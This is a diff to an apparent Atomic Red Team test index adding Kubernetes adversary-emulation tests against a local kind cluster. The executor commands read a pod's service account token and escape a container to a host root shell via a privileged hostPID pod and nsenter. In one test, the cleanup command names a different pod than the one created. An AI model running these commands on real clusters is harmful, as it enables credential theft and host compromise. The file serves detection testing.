@@ -568,6 +568,70 @@ credential-access:
 '
         name: bash
         elevation_required: false
+    - name: Cat the contents of a Kubernetes service account token file
+      auto_generated_guid: 788e0019-a483-45da-bcfe-96353d46820f
+      description: 'Access the Kubernetes service account access token stored within
+        a container in a cluster.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify docker is installed.
+        prereq_command: 'which docker
+
+'
+        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
+          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
+          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
+          echo "Docker installed"; fi
+
+'
+      - description: Verify docker service is running.
+        prereq_command: 'sudo systemctl status docker
+
+'
+        get_prereq_command: 'sudo systemctl start docker
+
+'
+      - description: Verify kind is in the path.
+        prereq_command: 'which kind
+
+'
+        get_prereq_command: |
+          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+          chmod +x ./kind
+          mv kind /usr/bin/kind
+      - description: Verify kind-atomic-cluster is created
+        prereq_command: 'sudo kind get clusters
+
+'
+        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
+
+'
+      - description: Verify kubectl is in path
+        prereq_command: 'which kubectl
+
+'
+        get_prereq_command: |
+          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+          chmod +x ./kubectl
+          mv kubectl /usr/bin/kubectl
+      - description: Verify atomic-pod is running.
+        prereq_command: 'kubectl --context kind-atomic-cluster get pods |grep atomic-pod
+
+'
+        get_prereq_command: 'kubectl --context kind-atomic-cluster run atomic-pod
+          --image=alpine --command -- sleep infinity
+
+'
+      executor:
+        command: 'kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
+
+'
+        name: sh
+        cleanup_command: kubectl --context kind-atomic-cluster delete pod atomic-pod
   T1056.004:
     technique:
       external_references:
@@ -11980,7 +12044,71 @@ privilege-escalation:
       - 'Container: Container Creation'
       - 'Process: OS API Execution'
       - 'Process: Process Creation'
-    atomic_tests: []
+      identifier: T1611
+    atomic_tests:
+    - name: Deploy container using nsenter container escape
+      auto_generated_guid: 0b2f9520-a17a-4671-9dba-3bd034099fff
+      description: |
+        In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
+
+        Additional Details:
+        - https://twitter.com/mauilion/status/1129468485480751104
+        - https://securekubernetes.com/scenario_2_attack/
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify docker is installed.
+        prereq_command: 'which docker
+
+'
+        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
+          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
+          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
+          echo "Docker installed"; fi
+
+'
+      - description: Verify docker service is running.
+        prereq_command: 'sudo systemctl status docker
+
+'
+        get_prereq_command: 'sudo systemctl start docker
+
+'
+      - description: Verify kind is in the path.
+        prereq_command: 'which kind
+
+'
+        get_prereq_command: |
+          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+          chmod +x ./kind
+          mv kind /usr/bin/kind
+      - description: Verify kind-atomic-cluster is created
+        prereq_command: 'sudo kind get clusters
+
+'
+        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
+
+'
+      - description: Verify kubectl is in path
+        prereq_command: 'which kubectl
+
+'
+        get_prereq_command: |
+          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+          chmod +x ./kubectl
+          mv kubectl /usr/bin/kubectl
+      executor:
+        command: 'kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod
+          --restart=Never -ti --rm --image alpine --overrides ''{"spec":{"hostPID":
+          true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":
+          true,"tty":true,"securityContext":{"privileged":true}}]}}''
+
+'
+        name: sh
+        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
+
+'
   T1546:
     technique:
       id: attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db
@@ -21423,7 +21551,70 @@ defense-evasion:
       - 'Pod: Pod Creation'
       - 'Pod: Pod Modification'
       - 'Application Log: Application Log Content'
-    atomic_tests: []
+      identifier: T1610
+    atomic_tests:
+    - name: Deploy container using nsenter container escape
+      auto_generated_guid: 58004e22-022c-4c51-b4a8-2b85ac5c596b
+      description: |
+        In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
+
+        Additional Details:
+        - https://twitter.com/mauilion/status/1129468485480751104
+        - https://securekubernetes.com/scenario_2_attack/
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify docker is installed.
+        prereq_command: 'which docker
+
+'
+        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
+          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
+          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
+          echo "Docker installed"; fi
+
+'
+      - description: Verify docker service is running.
+        prereq_command: 'sudo systemctl status docker
+
+'
+        get_prereq_command: 'sudo systemctl start docker
+
+'
+      - description: Verify kind is in the path.
+        prereq_command: 'which kind
+
+'
+        get_prereq_command: |
+          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+          chmod +x ./kind
+          mv kind /usr/bin/kind
+      - description: Verify kind-atomic-cluster is created
+        prereq_command: 'sudo kind get clusters
+
+'
+        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
+
+'
+      - description: Verify kubectl is in path
+        prereq_command: 'which kubectl
+
+'
+        get_prereq_command: |
+          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+          chmod +x ./kubectl
+          mv kubectl /usr/bin/kubectl
+      executor:
+        command: 'kubectl --context kind-atomic-cluster run atomic-escape-pod --restart=Never
+          -ti --rm --image alpine --overrides ''{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":
+          true,"tty":true,"securityContext":{"privileged":true}}]}}''
+
+'
+        name: sh
+        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
+
+'
   T1006:
     technique:
       id: attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5
@@ -57132,7 +57323,70 @@ execution:
       - 'Pod: Pod Creation'
       - 'Pod: Pod Modification'
       - 'Application Log: Application Log Content'
-    atomic_tests: []
+      identifier: T1610
+    atomic_tests:
+    - name: Deploy container using nsenter container escape
+      auto_generated_guid: 58004e22-022c-4c51-b4a8-2b85ac5c596b
+      description: |
+        In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
+
+        Additional Details:
+        - https://twitter.com/mauilion/status/1129468485480751104
+        - https://securekubernetes.com/scenario_2_attack/
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify docker is installed.
+        prereq_command: 'which docker
+
+'
+        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
+          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
+          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
+          echo "Docker installed"; fi
+
+'
+      - description: Verify docker service is running.
+        prereq_command: 'sudo systemctl status docker
+
+'
+        get_prereq_command: 'sudo systemctl start docker
+
+'
+      - description: Verify kind is in the path.
+        prereq_command: 'which kind
+
+'
+        get_prereq_command: |
+          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
+          chmod +x ./kind
+          mv kind /usr/bin/kind
+      - description: Verify kind-atomic-cluster is created
+        prereq_command: 'sudo kind get clusters
+
+'
+        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
+
+'
+      - description: Verify kubectl is in path
+        prereq_command: 'which kubectl
+
+'
+        get_prereq_command: |
+          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+          chmod +x ./kubectl
+          mv kubectl /usr/bin/kubectl
+      executor:
+        command: 'kubectl --context kind-atomic-cluster run atomic-escape-pod --restart=Never
+          -ti --rm --image alpine --overrides ''{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":
+          true,"tty":true,"securityContext":{"privileged":true}}]}}''
+
+'
+        name: sh
+        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
+
+'
   T1559.002:
     technique:
       created: '2020-02-12T14:10:50.699Z'
